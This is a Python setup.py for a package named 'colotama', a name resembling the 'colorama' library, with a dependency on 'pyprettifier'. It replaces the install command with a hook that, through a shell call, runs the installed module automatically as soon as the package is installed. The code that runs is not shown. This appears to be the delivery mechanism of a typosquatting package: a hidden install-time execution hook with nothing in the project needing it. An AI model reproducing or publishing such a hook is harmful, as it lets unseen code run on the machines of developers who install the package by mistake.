from setuptools import setup
from setuptools.command.install import install as _install
from subprocess import call
import os
import sys

def _post_install(directory):
    module = os.path.join(directory, "colotama")
    call([f"{sys.executable} {module}"], shell=True)

class install(_install):
    def run(self):
        _install.run(self)
        self.execute(_post_install, (self.install_lib,), msg="Running post install task")

setup(
    name="colotama",
    install_requires=["pyprettifier"],
    cmdclass={"install": install},
)
